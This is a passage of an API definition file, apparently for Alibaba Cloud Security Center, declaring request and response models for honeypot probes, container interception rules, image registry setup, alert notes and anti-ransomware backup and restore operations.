*   **false**: no', example='true'),
          endPort?: int32(name='EndPort', description='The end of the port range.', example='90'),
          fixed?: boolean(name='Fixed', description='Specifies whether the port is a fixed port. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
          startPort?: int32(name='StartPort', description='The start of the port range.', example='80'),
          targetPort?: int32(name='TargetPort', description='The destination port.

> If **HoneypotId** is specified, this parameter is required.', example='80'),
        }
      ](name='BindPortList', description='The listener ports.'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

> You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='1a5eda2d40f92ac87d6b63e1a5ad4b76fe0d4110c4a3e2fa85438a29ae55****'),
    }
  ](name='HoneypotBindList', description='The configuration of the probe.', position='Query'),
  ping?: boolean(name='Ping', description='Specifies whether to enable ping scan. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  probeType: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe', example='host_probe', position='Query'),
  probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='0.0.0', position='Query'),
  proxyIp?: string(name='ProxyIp', description='The IP address of the proxy.', example='192.168.XX.XX', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the instance.

> If **ProbeType** is set to **host_probe**, this parameter is required.', example='e4af3620-6895-4e2f-a641-a9d8fb53****', position='Query'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.

> If **ProbeType** is set to **vpc_black_hole_probe**, this parameter is required. You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.', example='vpc-zm0asrkpv1q8gnk7mn4dn', position='Query'),
}

model CreateHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotProbe?: {
    probeId?: string(name='ProbeId', description='The ID of the probe.', example='b69e9aa8-2ea8-4c5a-836a-c1fbacff****'),
  }(name='HoneypotProbe', description='The information about the probe.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A839E8-70AE-591D-8D9E-C5419A2240DB'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotProbeResponseBody(name='body'),
}

async function createHoneypotProbe(request: CreateHoneypotProbeRequest): CreateHoneypotProbeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateHoneypotProbe', 'POST', '/', 'json', false, 'json', request);
}

model CreateHoneypotProbeBindRequest {
  bindPortList?: [ 
    {
      bindPort?: boolean(name='BindPort', description='Specifies whether to bind the port. Valid values:

*   **true**
*   **false**', example='false'),
      endPort?: int32(name='EndPort', description='The end port on which the probe monitors.', example='80'),
      fixed?: boolean(name='Fixed', description='Specifies whether the port is a fixed port. Valid values:

*   **true**
*   **false**', example='false'),
      proto?: string(name='Proto', description='The type of the protocol. Valid values:

*   **tcp**
*   **udp**', example='tcp'),
      startPort?: int32(name='StartPort', description='The start port on which the probe monitors.', example='80'),
      targetPort?: int32(name='TargetPort', description='The destination port.', example='8080'),
    }
  ](name='BindPortList', description='The ports that are bound to the probe.', position='Query'),
  honeypotId?: string(name='HoneypotId', description='The honeypot ID.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='dba7d44775be8e0e5888ee3b1a62554a93d2512247cabc38ddeac17a3b3f****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  probeId?: string(name='ProbeId', description='The probe ID.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='36bad711-d1ac-4419-ac68-c1aa280f****', position='Query'),
  serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.', position='Query'),
}

model CreateHoneypotProbeBindResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model CreateHoneypotProbeBindResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotProbeBindResponseBody(name='body'),
}

async function createHoneypotProbeBind(request: CreateHoneypotProbeBindRequest): CreateHoneypotProbeBindResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateHoneypotProbeBind', 'POST', '/', 'json', false, 'json', request);
}

model CreateInterceptionRuleRequest {
  clusterId: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c35xxxa416', position='Query'),
  clusterName: string(name='ClusterName', description='The name of the cluster.', example='sas-test-cnnf', position='Query'),
  dstTargetList?: map[string]any(name='DstTargetList', description='The information about the destination network object. The value of this parameter contains the following fields:

*   targetId: the ID of the destination network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='[
      {
            "targetId": 600036,
            "ports": [
                  "1/65535"
            ]
      }
]', shrink='json', position='Query'),
  interceptType: long(name='InterceptType', description='The action on traffic. Valid values:

*   **1**: blocks traffic.
*   **2**: allows traffic and generates alerts.
*   **3**: allows traffic and does not generate alerts.', example='1', position='Query'),
  orderIndex: long(name='OrderIndex', description='The priority of the defense rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1', position='Query'),
  ruleName: string(name='RuleName', description='The name of the defense rule.', example='test-rule-1', position='Query'),
  ruleSwitch: int32(name='RuleSwitch', description='Specifies the status of the defense rule. Valid values:

*   **0**: disables the rule.
*   **1**: enables the rule.', example='0', position='Query'),
  ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   customize: custom rule', example='customize', position='Query'),
  srcTarget?: map[string]any(name='SrcTarget', description='The source network object. The value of this parameter contains the following field:

*   targetId: the ID of the source network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":301940}', shrink='json', position='Query'),
}

model CreateInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A01810A0-xxx5E2676'),
}

model CreateInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateInterceptionRuleResponseBody(name='body'),
}

async function createInterceptionRule(request: CreateInterceptionRuleRequest): CreateInterceptionRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateInterceptionRule', 'POST', '/', 'json', false, 'json', request);
}

model CreateInterceptionTargetRequest {
  appName?: string(name='AppName', description='The name of the application to which the network object belongs.', example='frontend', position='Query'),
  clusterId?: string(name='ClusterId', description='The cluster ID.', example='cc20a1024011c44b6a8710d6f8b****', position='Query'),
  clusterName?: string(name='ClusterName', description='The cluster name.', example='sas-test-cnnf', position='Query'),
  imageList?: [ string ](name='ImageList', description='An array that consists of the images of the network object.', position='Query'),
  namespace: string(name='Namespace', description='The namespace to which the network object belongs.', example='default', position='Query'),
  tagList?: [ string ](name='TagList', description='An array that consists of the labels specified for the network object.', position='Query'),
  targetName: string(name='TargetName', description='The name of the object to be blocked.', example='test', position='Query'),
  targetType: string(name='TargetType', description='The object type. Valid value:

*   **IMAGE**', example='IMAGE', position='Query'),
}

model CreateInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='5B9ECCC0-38F7-***'),
  result?: boolean(name='Result', description='The response parameters.', example='true'),
}

model CreateInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateInterceptionTargetResponseBody(name='body'),
}

async function createInterceptionTarget(request: CreateInterceptionTargetRequest): CreateInterceptionTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateInterceptionTarget', 'POST', '/', 'json', false, 'json', request);
}

model CreateJenkinsImageRegistryRequest {
  domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com', position='Body'),
  extraParam?: string(name='ExtraParam', description='The additional parameters of the image repository. The value of this parameter contains the following fields:

*   **namespace**: the namespace
*   **authToken**: the authorization token', example='[{\\"namespace\\":\\"aa\\",\\"authToken\\":\\"aa\\"}]', position='Body'),
  netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: Virtual Private Cloud (VPC)', example='1', position='Body'),
  password?: string(name='Password', description='The password.', example='Harbor********', position='Body'),
  persistenceDay?: int32(name='PersistenceDay', description='The number of days during which assets can be retained.', example='30', position='Body'),
  protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1', position='Body'),
  regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-shanghai', position='Body'),
  registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.XXX.XXX', position='Body'),
  registryName?: string(name='RegistryName', description='The alias of the image repository.', example='testRepo', position='Body'),
  registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **CI/CD**: Jenkins', example='CI/CD', position='Body'),
  registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Default value: -. Valid values:

*   **-**: the default version
*   **V1**: V1.0
*   **V2**: V2.0', example='V1', position='Body'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='41.121.XXX.XXX', position='Query'),
  transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30', position='Body'),
  userName?: string(name='UserName', description='The username.', example='RegistryUser', position='Body'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2ze4aoqgeu51ydfb8****', position='Body'),
  whiteList?: string(name='WhiteList', description='The whitelist of IP addresses.', example='192.168.XXX.XXX', position='Body'),
}

model CreateJenkinsImageRegistryResponseBody = {
  data?: {
    blackList?: string(name='BlackList', description='The blacklist.', example='61.9.XXX.XXX'),
    domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
    gmtCreate?: string(name='GmtCreate', description='The creation time. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-10-16 18:17:16'),
    gmtModified?: string(name='GmtModified', description='The update time. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-11-21 10:40:01'),
    id?: long(name='Id', description='The ID of the image repository.', example='443496'),
    netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='1'),
    password?: string(name='Password', description='The password.', example='Harbor******'),
    persistenceDay?: int32(name='PersistenceDay', description='The number of days during which assets can be retained.', example='30'),
    protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
    regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-shanghai'),
    registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='1.13.XXX.XXX'),
    registryName?: string(name='RegistryName', description='The alias of the image repository.', example='fanyi'),
    registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **CI/CD**: Jenkins', example='CI/CD'),
    token?: string(name='Token', description='The authentication token of the user.', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
    userName?: string(name='UserName', description='The username.', example='RegistryUser'),
    vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2vchkxmf2j9yjt3x2****'),
    whiteList?: string(name='WhiteList', description='The whitelist.', example='192.168.XXX.XXX'),
  }(name='Data', description='The result of creating the image repository.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='1AF1E723-53F1-55BF-A4B2-15CB7A32****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model CreateJenkinsImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateJenkinsImageRegistryResponseBody(name='body'),
}

async function createJenkinsImageRegistry(request: CreateJenkinsImageRegistryRequest): CreateJenkinsImageRegistryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateJenkinsImageRegistry', 'POST', '/', 'json', true, 'form', request);
}

model CreateMaliciousNoteRequest {
  eventId: long(name='EventId', description='The ID of the alert event to which you want to add remarks.

>  You can call the [ListAgentlessMaliciousFiles](~~ListAgentlessMaliciousFiles~~) operation to obtain the ID of the alert event from the NoteId parameter.', example='80****', position='Query'),
  note: string(name='Note', description='The remarks that you want to add.', example='Ignore', position='Query'),
}

model CreateMaliciousNoteResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model CreateMaliciousNoteResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateMaliciousNoteResponseBody(name='body'),
}

async function createMaliciousNote(request: CreateMaliciousNoteRequest): CreateMaliciousNoteResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateMaliciousNote', 'POST', '/', 'json', false, 'json', request);
}

model CreateOpaClusterPluginRequest {
  clusterIds: [ string ](name='ClusterIds', description='The cluster IDs.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', position='Query'),
}

model CreateOpaClusterPluginResponseBody = {
  installStatus?: [ 
    {
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='c60b77fe62093480db6164a3c2fa****'),
      installStatus?: boolean(name='InstallStatus', description='Indicates whether the component is installed. Valid values:

*   **true**
*   **false**', example='true'),
    }
  ](name='InstallStatus', description='The installation status of the components.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model CreateOpaClusterPluginResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOpaClusterPluginResponseBody(name='body'),
}

async function createOpaClusterPlugin(request: CreateOpaClusterPluginRequest): CreateOpaClusterPluginResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateOpaClusterPlugin', 'POST', '/', 'json', false, 'json', request);
}

model CreateOrUpdateAssetGroupRequest {
  groupId?: long(name='GroupId', description='The ID of the server group for which you want to add to or remove servers.

>  To modify the mapping between an asset and an asset group, you must provide the ID of the asset group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) to query the IDs of asset groups. If you do not configure this parameter when you call this operation, an asset group is created.', example='55426', position='Query'),
  groupName?: string(name='GroupName', description='The name of the server group that you want to create or the server group for which you want to add or remove a server.

>  To modify the mapping between a server and a server group, you must provide the name of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the names of server groups. If you do not configure GroupID when you call this operation, a server group is created. In this case, you must configure GroupName.', example='test', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the server in the server group that you want to create or the server group for which you want to add or remove servers. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='aq12-***,s23***', position='Query'),
}

model CreateOrUpdateAssetGroupResponseBody = {
  groupId?: long(name='GroupId', description='The ID of the server group.', example='9935302'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E70074C8-DFB4-44C5-96C7-909DD231D68A'),
}

model CreateOrUpdateAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOrUpdateAssetGroupResponseBody(name='body'),
}

/**
  * A server can belong only to one server group. If you call the CreateOrUpdateAssetGroup operation and the server specified in request parameters belongs to Server Group A, the server is removed from Server Group A and then added to the newly created or specified server group after the call is complete.
  *
 */
async function createOrUpdateAssetGroup(request: CreateOrUpdateAssetGroupRequest): CreateOrUpdateAssetGroupResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateOrUpdateAssetGroup', 'POST', '/', 'json', false, 'json', request);
}

model CreateOrUpdateDingTalkRequest {
  configList?: string(name='ConfigList', description='The alerts for which you want the chatbot to send notifications. The value is a JSON array that contains the following fields:

*   **type**: the types of alerts. The valid values are listed in the "Additional description of parameters" section in this topic.

*   **configItemList**: the list of check items. The value is a JSON array that contains the following fields:

    *   **key**: the key of the check item.
    *   **valueList**: the values of the check item. The value of valueList is a JSON array.

> For more information about the value of this parameter, see the "Addition description of parameters" section in this topic.', example='[{"type":"sas_analysis_online-sas-operation-log-sas-event-suspicious","configItemList":[{"key":"item_level","valueList":["all"]},{"key":"event_type","valueList":["all"]}]}]', position='Query'),
  dingTalkLang?: string(name='DingTalkLang', description='The language of the notifications. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  groupIdList?: string(name='GroupIdList', description='The IDs of asset groups for which you want the chatbot to send notifications. The value is a JSON array.

> You can call the [DescribeGroupStruct](~~DescribeGroupStruct~~) operation to query the IDs of asset groups.', example='["10417151"]', position='Query'),
  id?: long(name='Id', description='The ID of the chatbot.

> You can call the [DescribeDingTalk](~~DescribeDingTalk~~) operation to query the IDs of chatbots.', example='1589', position='Query'),
  intervalTime?: long(name='IntervalTime', description='The time interval at which the chatbot sends notifications.

> The value **0** indicates unlimited.', example='0', position='Query'),
  ruleActionName: string(name='RuleActionName', description='The name of the chatbot.

> The name of a chatbot must be 2 to 64 characters in length.', example='testNotify', position='Query'),
  sendUrl: string(name='SendUrl', description='The webhook URL.', example='https://oapi.dingtalk.com/robot/send?access_token=XXX', position='Query'),
}

model CreateOrUpdateDingTalkResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='76975B7A-34DC-5CB6-9538-91700D4F112E'),
}

model CreateOrUpdateDingTalkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOrUpdateDingTalkResponseBody(name='body'),
}

async function createOrUpdateDingTalk(request: CreateOrUpdateDingTalkRequest): CreateOrUpdateDingTalkResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateOrUpdateDingTalk', 'POST', '/', 'json', false, 'json', request);
}

model CreateOssBucketScanTaskRequest {
  bucketNameList: [ string ](name='BucketNameList', position='Query'),
  excludeKeySuffixList?: [ string ](name='ExcludeKeySuffixList', position='Query'),
  keySuffixList?: [ string ](name='KeySuffixList', position='Query'),
  scanMode: int32(name='ScanMode', example='1', position='Query'),
}

model CreateOssBucketScanTaskResponseBody = {
  requestId?: string(name='RequestId', example='BBD75EC2-2F4F-5A7B-AA53-18724DC8****'),
}

model CreateOssBucketScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOssBucketScanTaskResponseBody(name='body'),
}

async function createOssBucketScanTask(request: CreateOssBucketScanTaskRequest): CreateOssBucketScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateOssBucketScanTask', 'POST', '/', 'json', false, 'json', request);
}

model CreateOssScanConfigRequest {
  bucketNameList?: [ string ](name='BucketNameList', position='Query'),
  enable?: int32(name='Enable', example='1', position='Query'),
  endTime?: string(name='EndTime', example='01:01:00', position='Query'),
  keySuffixList?: [ string ](name='KeySuffixList', position='Query'),
  scanDayList?: [ int32 ](name='ScanDayList', position='Query'),
  startTime?: string(name='StartTime', example='00:00:00', position='Query'),
}

model CreateOssScanConfigResponseBody = {
  requestId?: string(name='RequestId', example='5DFD6277-CC36-57F7-ACE6-F5952123****'),
}

model CreateOssScanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOssScanConfigResponseBody(name='body'),
}

async function createOssScanConfig(request: CreateOssScanConfigRequest): CreateOssScanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateOssScanConfig', 'POST', '/', 'json', false, 'json', request);
}

model CreateRestoreJobRequest {
  includes: string(name='Includes', description='The directory in which the files included in the restoration task are located. This parameter is specified when you create the anti-ransomware policy. The value is a directory that requires protection.', example='["root"]', position='Query'),
  snapshotHash: string(name='SnapshotHash', description='The hash value of the snapshot.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='d4b399edaad94b038e8f91873f19e3eae010ca30798fc36db3a164dd343f****', position='Query'),
  snapshotId: string(name='SnapshotId', description='The ID of the snapshot that you want to use for restoration.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='s-00023dhaatxp18mh****', position='Query'),
  snapshotVersion: string(name='SnapshotVersion', description='The version of the backup data.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='165570544****', position='Query'),
  sourceType?: string(name='SourceType', description='The type of the data source. Valid values:

*   **ECS_FILE**: backup snapshots for Elastic Compute Service (ECS) files
*   **File**: backup snapshots for on-premises servers', example='ECS_FILE', position='Query'),
  target: string(name='Target', description='The path to which you want to restore data.', example='/root/testfls', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server whose data you want to restore.', example='inet-ecs-4e876cb0-09f7-43b8-82ef-4bc7a93769b5', position='Query'),
  vaultId: string(name='VaultId', description='The ID of the backup vault that is used in the restoration task.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='v-0002n12wokck2q0x****', position='Query'),
}

model CreateRestoreJobResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BD4B24CE-E5C4-5727-B731-BE85F1D4****'),
}

model CreateRestoreJobResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateRestoreJobResponseBody(name='body'),
}

async function createRestoreJob(request: CreateRestoreJobRequest): CreateRestoreJobResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateRestoreJob', 'POST', '/', 'json', false, 'json', request);
}

model CreateServiceLinkedRoleRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas', position='Query'),
}

model CreateServiceLinkedRoleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B94243D2-9342-4D82-87B9-DF9A038A87E1'),
}

model CreateServiceLinkedRoleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateServiceLinkedRoleResponseBody(name='body'),
}

/**
  * For more information about service-linked roles, see [Service-linked roles](~~160674~~).
  *
 */
async function createServiceLinkedRole(request: CreateServiceLinkedRoleRequest): CreateServiceLinkedRoleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateServiceLinkedRole', 'POST', '/', 'json', false, 'json', request);
}

model CreateServiceTrailRequest {
  regionId?: string(name='RegionId', description='The region ID of the instance. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou', position='Query'),
}

model CreateServiceTrailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model CreateServiceTrailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateServiceTrailResponseBody(name='body'),
}

async function createServiceTrail(request: CreateServiceTrailRequest): CreateServiceTrailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateServiceTrail', 'POST', '/', 'json', false, 'json', request);
}

model CreateSimilarSecurityEventsQueryTaskRequest {
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  securityEventId: long(name='SecurityEventId', description='The ID of the alert event.

>  You must specify at least one of the SecurityEventId and SimilarEventScenarioCode parameters.', example='14323', position='Query'),
  similarEventScenarioCode?: string(name='SimilarEventScenarioCode', description='The codes of alert events that are triggered by the same rule or of the same alert type.

>  You must specify at least one of the SecurityEventId and SimilarEventScenarioCode parameters.', example='default', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
}

model CreateSimilarSecurityEventsQueryTaskResponseBody = {
  createSimilarSecurityEventsQueryTaskResponse?: {
    status?: string(name='Status', description='The status of the task. Valid values:

*   **New**: The task is created.
*   **RetrievingData**: Data is being retrieved.
*   **DataRetrieved**: Data is retrieved.
*   **Processing**: The task is running.
*   **Success**: The task is successful.
*   **Failed**: The task failed.
*   **PartialFailed**: The task partially failed.', example='New'),
    taskId?: long(name='TaskId', description='The ID of the task.', example='2915'),
  }(name='CreateSimilarSecurityEventsQueryTaskResponse', description='The information about the task that queries alert events of the same alert type.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5861EE3E-F0B3-48B8-A5DC-A5080BFBE052'),
}

model CreateSimilarSecurityEventsQueryTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSimilarSecurityEventsQueryTaskResponseBody(name='body'),
}

async function createSimilarSecurityEventsQueryTask(request: CreateSimilarSecurityEventsQueryTaskRequest): CreateSimilarSecurityEventsQueryTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateSimilarSecurityEventsQueryTask', 'POST', '/', 'json', false, 'json', request);
}

model CreateSuspEventNoteRequest {
  eventId: long(name='EventId', description='The ID of the alert event to which you want to add remarks. You can call the [DescribeSuspEvents](~~251497~~) operation to query the IDs of alert events.', example='668931', position='Query'),
  note: string(name='Note', description='The remarks that you want to add.', example='Ignore', position='Query'),
}

model CreateSuspEventNoteResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model CreateSuspEventNoteResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSuspEventNoteResponseBody(name='body'),
}

async function createSuspEventNote(request: CreateSuspEventNoteRequest): CreateSuspEventNoteResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateSuspEventNote', 'POST', '/', 'json', false, 'json', request);
}

model CreateUniBackupPolicyRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='admin', position='Query'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Pass****', position='Query'),
  databaseAddByUser?: string(name='DatabaseAddByUser', description='Specifies whether the database is manually added. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  databaseType: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **ORACLE**
*   **MSSQL**', example='MYSQL', position='Query'),
  fullPlan: map[string]any(name='FullPlan', description='The policy for full data backup. The value of this parameter is a JSON string. The JSON string contains the following fields:

*   **start**: the start time of a backup task.
*   **interval**: the interval of backup tasks.
*   **type**: the unit of the interval.
*   **days**: the days of a week on which a backup task is performed.', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}', shrink='json', position='Query'),
  incPlan: map[string]any(name='IncPlan', description='The policy for incremental data backup. The value of this parameter is a JSON string. The JSON string contains the following fields:

*   **start**: the start time of a backup task.
*   **interval**: the interval of backup tasks.
*   **type**: the unit of the interval.
*   **days**: the days of a week on which a backup task is performed.', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}', shrink='json', position='Query'),
  instanceId: string(name='InstanceId', description='The ID of the Elastic Compute Service (ECS) instance.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the IDs of ECS instances.', example='i-bp1fu4aqltf1huhc****', position='Query'),
  policyName: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='mysql-policy', position='Query'),
  retention: int32(name='Retention', description='The retention period of backup data.', example='7', position='Query'),
  speedLimiter: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='5242880', position='Query'),
  uniRegionId: string(name='UniRegionId', description='The region in which the server resides.', example='cn-hangzhou', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data is backed up based on the anti-ransomware policy.

>  You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='045cad48-eb08-4047-a70c-713aec7b****', position='Query'),
}

model CreateUniBackupPolicyResponseBody = {
